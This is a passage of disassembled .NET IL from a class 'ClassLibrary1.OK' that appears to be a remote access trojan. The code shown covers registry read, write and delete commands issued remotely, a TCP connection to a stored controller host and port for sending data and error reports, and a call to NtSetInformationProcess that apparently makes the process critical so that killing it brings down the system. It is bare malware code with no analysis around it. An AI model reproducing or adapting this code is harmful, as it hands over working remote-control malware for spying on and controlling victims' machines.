      IL_157c:  ldloc.s    V_60
      IL_157e:  ldc.i4.2
      IL_157f:  ldstr      "/"
      IL_1584:  stelem.ref
      IL_1585:  ldloc.s    V_60
      IL_1587:  ldc.i4.3
      IL_1588:  ldloc.s    V_51
      IL_158a:  ldloc.s    V_55
      IL_158c:  callvirt   instance valuetype [mscorlib]Microsoft.Win32.RegistryValueKind [mscorlib]Microsoft.Win32.RegistryKey::GetValueKind(string)
      IL_1591:  box        [mscorlib]Microsoft.Win32.RegistryValueKind
      IL_1596:  callvirt   instance string [mscorlib]System.Enum::ToString()
      IL_159b:  stelem.ref
      IL_159c:  ldloc.s    V_60
      IL_159e:  ldc.i4.4
      IL_159f:  ldstr      "/"
      IL_15a4:  stelem.ref
      IL_15a5:  ldloc.s    V_60
      IL_15a7:  ldc.i4.5
      IL_15a8:  ldloc.s    V_51
      IL_15aa:  ldloc.s    V_55
      IL_15ac:  ldstr      ""
      IL_15b1:  callvirt   instance object [mscorlib]Microsoft.Win32.RegistryKey::GetValue(string,
                                                                                           object)
      IL_15b6:  callvirt   instance string [mscorlib]System.Object::ToString()
      IL_15bb:  stelem.ref
      IL_15bc:  ldloc.s    V_60
      IL_15be:  ldc.i4.6
      IL_15bf:  ldsfld     string ClassLibrary1.OK::Y
      IL_15c4:  stelem.ref
      IL_15c5:  ldloc.s    V_60
      IL_15c7:  call       string [mscorlib]System.String::Concat(string[])
      IL_15cc:  stloc.s    V_52
      IL_15ce:  ldloc.s    V_88
      IL_15d0:  ldc.i4.1
      IL_15d1:  add.ovf
      IL_15d2:  stloc.s    V_88
      IL_15d4:  ldloc.s    V_88
      IL_15d6:  ldloc.s    V_89
      IL_15d8:  ldlen
      IL_15d9:  conv.ovf.i4
      IL_15da:  blt.s      IL_1561

      IL_15dc:  ldloc.s    V_53
      IL_15de:  ldloc.s    V_52
      IL_15e0:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_15e5:  call       bool ClassLibrary1.OK::Send(string)
      IL_15ea:  pop
      IL_15eb:  br.s       IL_1668

      IL_15ed:  ldloc.s    V_85
      IL_15ef:  ldstr      "!"
      IL_15f4:  ldc.i4.0
      IL_15f5:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_15fa:  ldc.i4.0
      IL_15fb:  bne.un.s   IL_1614

      IL_15fd:  ldloc.s    V_51
      IL_15ff:  ldloc.0
      IL_1600:  ldc.i4.3
      IL_1601:  ldelem.ref
      IL_1602:  ldloc.0
      IL_1603:  ldc.i4.4
      IL_1604:  ldelem.ref
      IL_1605:  ldloc.0
      IL_1606:  ldc.i4.5
      IL_1607:  ldelem.ref
      IL_1608:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToInteger(string)
      IL_160d:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::SetValue(string,
                                                                                         object,
                                                                                         valuetype [mscorlib]Microsoft.Win32.RegistryValueKind)
      IL_1612:  br.s       IL_1668

      IL_1614:  ldloc.s    V_85
      IL_1616:  ldstr      "@"
      IL_161b:  ldc.i4.0
      IL_161c:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_1621:  ldc.i4.0
      IL_1622:  bne.un.s   IL_1631

      IL_1624:  ldloc.s    V_51
      IL_1626:  ldloc.0
      IL_1627:  ldc.i4.3
      IL_1628:  ldelem.ref
      IL_1629:  ldc.i4.0
      IL_162a:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::DeleteValue(string,
                                                                                            bool)
      IL_162f:  br.s       IL_1668

      IL_1631:  ldloc.s    V_85
      IL_1633:  ldstr      "#"
      IL_1638:  ldc.i4.0
      IL_1639:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_163e:  ldc.i4.0
      IL_163f:  bne.un.s   IL_164e

      IL_1641:  ldloc.s    V_51
      IL_1643:  ldloc.0
      IL_1644:  ldc.i4.3
      IL_1645:  ldelem.ref
      IL_1646:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::CreateSubKey(string)
      IL_164b:  pop
      IL_164c:  br.s       IL_1668

      IL_164e:  ldloc.s    V_85
      IL_1650:  ldstr      "$"
      IL_1655:  ldc.i4.0
      IL_1656:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_165b:  ldc.i4.0
      IL_165c:  bne.un.s   IL_1668

      IL_165e:  ldloc.s    V_51
      IL_1660:  ldloc.0
      IL_1661:  ldc.i4.3
      IL_1662:  ldelem.ref
      IL_1663:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::DeleteSubKeyTree(string)
      IL_1668:  leave.s    IL_16cc

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_166a:  dup
      IL_166b:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_1670:  stloc.s    V_56
      .try
      {
        IL_1672:  ldc.i4.5
        IL_1673:  newarr     [mscorlib]System.String
        IL_1678:  stloc.s    V_60
        IL_167a:  ldloc.s    V_60
        IL_167c:  ldc.i4.0
        IL_167d:  ldstr      "ER"
        IL_1682:  stelem.ref
        IL_1683:  ldloc.s    V_60
        IL_1685:  ldc.i4.1
        IL_1686:  ldsfld     string ClassLibrary1.OK::Y
        IL_168b:  stelem.ref
        IL_168c:  ldloc.s    V_60
        IL_168e:  ldc.i4.2
        IL_168f:  ldloc.0
        IL_1690:  ldc.i4.0
        IL_1691:  ldelem.ref
        IL_1692:  stelem.ref
        IL_1693:  ldloc.s    V_60
        IL_1695:  ldc.i4.3
        IL_1696:  ldsfld     string ClassLibrary1.OK::Y
        IL_169b:  stelem.ref
        IL_169c:  ldloc.s    V_60
        IL_169e:  ldc.i4.4
        IL_169f:  ldloc.s    V_56
        IL_16a1:  callvirt   instance string [mscorlib]System.Exception::get_Message()
        IL_16a6:  stelem.ref
        IL_16a7:  ldloc.s    V_60
        IL_16a9:  call       string [mscorlib]System.String::Concat(string[])
        IL_16ae:  call       bool ClassLibrary1.OK::Send(string)
        IL_16b3:  pop
        IL_16b4:  leave.s    IL_16c5

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_16b6:  dup
        IL_16b7:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_16bc:  stloc.s    V_57
        IL_16be:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_16c3:  leave.s    IL_16c5

      }  // end handler
      IL_16c5:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_16ca:  leave.s    IL_16cc

    }  // end handler
    IL_16cc:  ret
  } // end of method OK::Ind

  .method public static string  getMD5Hash(uint8[] B) cil managed
  {
    // Code size       70 (0x46)
    .maxstack  3
    .locals init (string V_0,
             class [mscorlib]System.Security.Cryptography.MD5CryptoServiceProvider V_1,
             string V_2,
             uint8 V_3,
             int32 V_4,
             uint8[] V_5)
    IL_0000:  newobj     instance void [mscorlib]System.Security.Cryptography.MD5CryptoServiceProvider::.ctor()
    IL_0005:  stloc.1
    IL_0006:  ldloc.1
    IL_0007:  ldarg.0
    IL_0008:  callvirt   instance uint8[] [mscorlib]System.Security.Cryptography.HashAlgorithm::ComputeHash(uint8[])
    IL_000d:  starg.s    B
    IL_000f:  ldstr      ""
    IL_0014:  stloc.2
    IL_0015:  ldarg.0
    IL_0016:  stloc.s    V_5
    IL_0018:  ldc.i4.0
    IL_0019:  stloc.s    V_4
    IL_001b:  br.s       IL_003c

    IL_001d:  ldloc.s    V_5
    IL_001f:  ldloc.s    V_4
    IL_0021:  ldelem.u1
    IL_0022:  stloc.3
    IL_0023:  ldloc.2
    IL_0024:  ldloca.s   V_3
    IL_0026:  ldstr      "x2"
    IL_002b:  call       instance string [mscorlib]System.Byte::ToString(string)
    IL_0030:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_0035:  stloc.2
    IL_0036:  ldloc.s    V_4
    IL_0038:  ldc.i4.1
    IL_0039:  add.ovf
    IL_003a:  stloc.s    V_4
    IL_003c:  ldloc.s    V_4
    IL_003e:  ldloc.s    V_5
    IL_0040:  ldlen
    IL_0041:  conv.ovf.i4
    IL_0042:  blt.s      IL_001d

    IL_0044:  ldloc.2
    IL_0045:  ret
  } // end of method OK::getMD5Hash

  .method public static class [mscorlib]Microsoft.Win32.RegistryKey 
          GetKey(string key) cil managed
  {
    // Code size       374 (0x176)
    .maxstack  3
    .locals init (class [mscorlib]Microsoft.Win32.RegistryKey V_0,
             string V_1)
    IL_0000:  ldarg.0
    IL_0001:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer ClassLibrary1.OK::F
    IL_0006:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
    IL_000b:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_ClassesRoot()
    IL_0010:  callvirt   instance string [mscorlib]Microsoft.Win32.RegistryKey::get_Name()
    IL_0015:  callvirt   instance bool [mscorlib]System.String::StartsWith(string)
    IL_001a:  brfalse.s  IL_005d

    IL_001c:  ldarg.0
    IL_001d:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer ClassLibrary1.OK::F
    IL_0022:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
    IL_0027:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_ClassesRoot()
    IL_002c:  callvirt   instance string [mscorlib]Microsoft.Win32.RegistryKey::get_Name()
    IL_0031:  ldstr      "\\"
    IL_0036:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_003b:  ldstr      ""
    IL_0040:  callvirt   instance string [mscorlib]System.String::Replace(string,
                                                                          string)
    IL_0045:  stloc.1
    IL_0046:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer ClassLibrary1.OK::F
    IL_004b:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
    IL_0050:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_ClassesRoot()
    IL_0055:  ldloc.1
    IL_0056:  ldc.i4.1
    IL_0057:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::OpenSubKey(string,
                                                                                                                                bool)
    IL_005c:  ret

    IL_005d:  ldarg.0
    IL_005e:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer ClassLibrary1.OK::F
    IL_0063:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
    IL_0068:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_CurrentUser()
    IL_006d:  callvirt   instance string [mscorlib]Microsoft.Win32.RegistryKey::get_Name()
    IL_0072:  callvirt   instance bool [mscorlib]System.String::StartsWith(string)
    IL_0077:  brfalse.s  IL_00ba

    IL_0079:  ldarg.0
    IL_007a:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer ClassLibrary1.OK::F
    IL_007f:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
    IL_0084:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_CurrentUser()
    IL_0089:  callvirt   instance string [mscorlib]Microsoft.Win32.RegistryKey::get_Name()
    IL_008e:  ldstr      "\\"
    IL_0093:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_0098:  ldstr      ""
    IL_009d:  callvirt   instance string [mscorlib]System.String::Replace(string,
                                                                          string)
    IL_00a2:  stloc.1
    IL_00a3:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer ClassLibrary1.OK::F
    IL_00a8:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
    IL_00ad:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_CurrentUser()
    IL_00b2:  ldloc.1
    IL_00b3:  ldc.i4.1
    IL_00b4:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::OpenSubKey(string,
                                                                                                                                bool)
    IL_00b9:  ret

    IL_00ba:  ldarg.0
    IL_00bb:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer ClassLibrary1.OK::F
    IL_00c0:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
    IL_00c5:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_LocalMachine()
    IL_00ca:  callvirt   instance string [mscorlib]Microsoft.Win32.RegistryKey::get_Name()
    IL_00cf:  callvirt   instance bool [mscorlib]System.String::StartsWith(string)
    IL_00d4:  brfalse.s  IL_0117

    IL_00d6:  ldarg.0
    IL_00d7:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer ClassLibrary1.OK::F
    IL_00dc:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
    IL_00e1:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_LocalMachine()
    IL_00e6:  callvirt   instance string [mscorlib]Microsoft.Win32.RegistryKey::get_Name()
    IL_00eb:  ldstr      "\\"
    IL_00f0:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_00f5:  ldstr      ""
    IL_00fa:  callvirt   instance string [mscorlib]System.String::Replace(string,
                                                                          string)
    IL_00ff:  stloc.1
    IL_0100:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer ClassLibrary1.OK::F
    IL_0105:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
    IL_010a:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_LocalMachine()
    IL_010f:  ldloc.1
    IL_0110:  ldc.i4.1
    IL_0111:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::OpenSubKey(string,
                                                                                                                                bool)
    IL_0116:  ret

    IL_0117:  ldarg.0
    IL_0118:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer ClassLibrary1.OK::F
    IL_011d:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
    IL_0122:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_Users()
    IL_0127:  callvirt   instance string [mscorlib]Microsoft.Win32.RegistryKey::get_Name()
    IL_012c:  callvirt   instance bool [mscorlib]System.String::StartsWith(string)
    IL_0131:  brfalse.s  IL_0174

    IL_0133:  ldarg.0
    IL_0134:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer ClassLibrary1.OK::F
    IL_0139:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
    IL_013e:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_Users()
    IL_0143:  callvirt   instance string [mscorlib]Microsoft.Win32.RegistryKey::get_Name()
    IL_0148:  ldstr      "\\"
    IL_014d:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_0152:  ldstr      ""
    IL_0157:  callvirt   instance string [mscorlib]System.String::Replace(string,
                                                                          string)
    IL_015c:  stloc.1
    IL_015d:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer ClassLibrary1.OK::F
    IL_0162:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
    IL_0167:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_Users()
    IL_016c:  ldloc.1
    IL_016d:  ldc.i4.1
    IL_016e:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::OpenSubKey(string,
                                                                                                                                bool)
    IL_0173:  ret

    IL_0174:  ldnull
    IL_0175:  ret
  } // end of method OK::GetKey

  .method public static void  pr(int32 i) cil managed
  {
    // Code size       38 (0x26)
    .maxstack  4
    .locals init (class [mscorlib]System.Exception V_0)
    .try
    {
      IL_0000:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::GetCurrentProcess()
      IL_0005:  callvirt   instance native int [System]System.Diagnostics.Process::get_Handle()
      IL_000a:  ldc.i4.s   29
      IL_000c:  ldarga.s   i
      IL_000e:  ldc.i4.4
      IL_000f:  call       int32 ClassLibrary1.OK::NtSetInformationProcess(native int,
                                                                           int32,
                                                                           int32&,
                                                                           int32)
      IL_0014:  pop
      IL_0015:  leave.s    IL_0025

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0017:  dup
      IL_0018:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_001d:  stloc.0
      IL_001e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0023:  leave.s    IL_0025

    }  // end handler
    IL_0025:  ret
  } // end of method OK::pr

  .method public static bool  Sendb(uint8[] b) cil managed
  {
    // Code size       187 (0xbb)
    .maxstack  5
    .locals init (bool V_0,
             class [mscorlib]System.IO.MemoryStream V_1,
             class [mscorlib]System.Exception V_2,
             class [mscorlib]System.Exception V_3,
             class [mscorlib]System.IO.FileInfo V_4)
    IL_0000:  ldsfld     bool ClassLibrary1.OK::Cn
    IL_0005:  brtrue.s   IL_0009

    IL_0007:  ldc.i4.0
    IL_0008:  ret

    IL_0009:  ldsfld     class [mscorlib]System.IO.FileInfo ClassLibrary1.OK::LO
    IL_000e:  stloc.s    V_4
    IL_0010:  ldloc.s    V_4
    IL_0012:  call       void [mscorlib]System.Threading.Monitor::Enter(object)
    .try
    {
      IL_0017:  ldsfld     bool ClassLibrary1.OK::Cn
      IL_001c:  brtrue.s   IL_0025

      IL_001e:  ldc.i4.0
      IL_001f:  stloc.0
      IL_0020:  leave      IL_00b9

      .try
      {
        IL_0025:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
        IL_002a:  stloc.1
        IL_002b:  ldloc.1
        IL_002c:  ldarg.0
        IL_002d:  ldc.i4.0
        IL_002e:  ldarg.0
        IL_002f:  ldlen
        IL_0030:  conv.ovf.i4
        IL_0031:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                                   int32,
                                                                                   int32)
        IL_0036:  ldloc.1
        IL_0037:  ldsflda    string ClassLibrary1.OK::SPL
        IL_003c:  call       uint8[] ClassLibrary1.OK::SB(string&)
        IL_0041:  ldc.i4.0
        IL_0042:  ldsfld     string ClassLibrary1.OK::SPL
        IL_0047:  callvirt   instance int32 [mscorlib]System.String::get_Length()
        IL_004c:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                                   int32,
                                                                                   int32)
        IL_0051:  ldsfld     class [System]System.Net.Sockets.TcpClient ClassLibrary1.OK::C
        IL_0056:  callvirt   instance class [System]System.Net.Sockets.Socket [System]System.Net.Sockets.TcpClient::get_Client()
        IL_005b:  ldloc.1
        IL_005c:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
        IL_0061:  ldc.i4.0
        IL_0062:  ldloc.1
        IL_0063:  callvirt   instance int64 [mscorlib]System.IO.MemoryStream::get_Length()
        IL_0068:  conv.ovf.i4
        IL_0069:  ldc.i4.0
        IL_006a:  callvirt   instance int32 [System]System.Net.Sockets.Socket::Send(uint8[],
                                                                                    int32,
                                                                                    int32,
                                                                                    valuetype [System]System.Net.Sockets.SocketFlags)
        IL_006f:  pop
        IL_0070:  ldloc.1
        IL_0071:  callvirt   instance void [mscorlib]System.IO.Stream::Dispose()
        IL_0076:  ldc.i4.1
        IL_0077:  stloc.0
        IL_0078:  leave.s    IL_00b9

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_007a:  dup
        IL_007b:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_0080:  stloc.2
        .try
        {
          IL_0081:  ldsfld     bool ClassLibrary1.OK::Cn
          IL_0086:  brfalse.s  IL_0092

          IL_0088:  ldsfld     class [System]System.Net.Sockets.TcpClient ClassLibrary1.OK::C
          IL_008d:  callvirt   instance void [System]System.Net.Sockets.TcpClient::Close()
          IL_0092:  leave.s    IL_00a2

        }  // end .try
        catch [mscorlib]System.Exception 
        {
          IL_0094:  dup
          IL_0095:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
          IL_009a:  stloc.3
          IL_009b:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
          IL_00a0:  leave.s    IL_00a2

        }  // end handler
        IL_00a2:  ldc.i4.0
        IL_00a3:  stsfld     bool ClassLibrary1.OK::Cn
        IL_00a8:  ldc.i4.0
        IL_00a9:  stloc.0
        IL_00aa:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_00af:  leave.s    IL_00b9

      }  // end handler
    }  // end .try
    finally
    {
      IL_00b1:  ldloc.s    V_4
      IL_00b3:  call       void [mscorlib]System.Threading.Monitor::Exit(object)
      IL_00b8:  endfinally
    }  // end handler
    IL_00b9:  ldloc.0
    IL_00ba:  ret
  } // end of method OK::Sendb

  .method public static bool  Send(string S) cil managed
  {
    // Code size       13 (0xd)
    .maxstack  1
    .locals init (bool V_0)
    IL_0000:  ldarga.s   S
    IL_0002:  call       uint8[] ClassLibrary1.OK::SB(string&)
    IL_0007:  call       bool ClassLibrary1.OK::Sendb(uint8[])
    IL_000c:  ret
  } // end of method OK::Send

  .method public static bool  connect() cil managed
  {
    // Code size       286 (0x11e)
    .maxstack  3
    .locals init (bool V_0,
             class [mscorlib]System.Exception V_1,
             class [mscorlib]System.Exception V_2,
             class [mscorlib]System.Exception V_3,
             class [mscorlib]System.Exception V_4,
             class [mscorlib]System.Exception V_5,
             class [mscorlib]System.Exception V_6,
             class [mscorlib]System.IO.FileInfo V_7)
    IL_0000:  ldsfld     class [mscorlib]System.IO.FileInfo ClassLibrary1.OK::LO
    IL_0005:  stloc.s    V_7
    IL_0007:  ldloc.s    V_7
    IL_0009:  call       void [mscorlib]System.Threading.Monitor::Enter(object)
    .try
    {
      .try
      {
        IL_000e:  ldsfld     class [System]System.Net.Sockets.TcpClient ClassLibrary1.OK::C
        IL_0013:  brfalse.s  IL_0055

        .try
        {
          IL_0015:  ldsfld     class [System]System.Net.Sockets.TcpClient ClassLibrary1.OK::C
          IL_001a:  callvirt   instance class [System]System.Net.Sockets.Socket [System]System.Net.Sockets.TcpClient::get_Client()
          IL_001f:  ldc.i4.0
          IL_0020:  callvirt   instance void [System]System.Net.Sockets.Socket::Disconnect(bool)
          IL_0025:  leave.s    IL_0035

        }  // end .try
        catch [mscorlib]System.Exception 
        {
          IL_0027:  dup
          IL_0028:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
          IL_002d:  stloc.1
          IL_002e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
          IL_0033:  leave.s    IL_0035

        }  // end handler
        .try
        {
          IL_0035:  ldsfld     class [System]System.Net.Sockets.TcpClient ClassLibrary1.OK::C
          IL_003a:  callvirt   instance void [System]System.Net.Sockets.TcpClient::Close()
          IL_003f:  ldnull
          IL_0040:  stsfld     class [System]System.Net.Sockets.TcpClient ClassLibrary1.OK::C
          IL_0045:  leave.s    IL_0055

        }  // end .try
        catch [mscorlib]System.Exception 
        {
          IL_0047:  dup
          IL_0048:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
          IL_004d:  stloc.2
          IL_004e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
          IL_0053:  leave.s    IL_0055

        }  // end handler
        .try
        {
          IL_0055:  ldsfld     class [mscorlib]System.IO.MemoryStream ClassLibrary1.OK::MeM
          IL_005a:  callvirt   instance void [mscorlib]System.IO.Stream::Dispose()
          IL_005f:  leave.s    IL_006f

        }  // end .try
        catch [mscorlib]System.Exception 
        {
          IL_0061:  dup
          IL_0062:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
          IL_0067:  stloc.3
          IL_0068:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
          IL_006d:  leave.s    IL_006f

        }  // end handler
        IL_006f:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
        IL_0074:  stsfld     class [mscorlib]System.IO.MemoryStream ClassLibrary1.OK::MeM
        .try
        {
          IL_0079:  ldsfld     class [System]System.Diagnostics.Process ClassLibrary1.OK::Pro
          IL_007e:  brfalse.s  IL_0090

          IL_0080:  ldsfld     class [System]System.Diagnostics.Process ClassLibrary1.OK::Pro
          IL_0085:  callvirt   instance void [System]System.Diagnostics.Process::Kill()
          IL_008a:  ldnull
          IL_008b:  stsfld     class [System]System.Diagnostics.Process ClassLibrary1.OK::Pro
          IL_0090:  leave.s    IL_00b0

        }  // end .try
        catch [mscorlib]System.Exception 
        {
          IL_0092:  dup
          IL_0093:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
          IL_0098:  stloc.s    V_4
          IL_009a:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
          IL_009f:  leave.s    IL_00b0

        }  // end handler
      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_00a1:  dup
        IL_00a2:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_00a7:  stloc.s    V_5
        IL_00a9:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_00ae:  leave.s    IL_00b0

      }  // end handler
      .try
      {
        IL_00b0:  newobj     instance void [System]System.Net.Sockets.TcpClient::.ctor()
        IL_00b5:  stsfld     class [System]System.Net.Sockets.TcpClient ClassLibrary1.OK::C
        IL_00ba:  ldc.i4     0x3e8
        IL_00bf:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
        IL_00c4:  ldsfld     class [System]System.Net.Sockets.TcpClient ClassLibrary1.OK::C
        IL_00c9:  ldsfld     string ClassLibrary1.OK::H
        IL_00ce:  ldsfld     string ClassLibrary1.OK::P
        IL_00d3:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToInteger(string)
        IL_00d8:  callvirt   instance void [System]System.Net.Sockets.TcpClient::Connect(string,
                                                                                         int32)
        IL_00dd:  ldc.i4.1
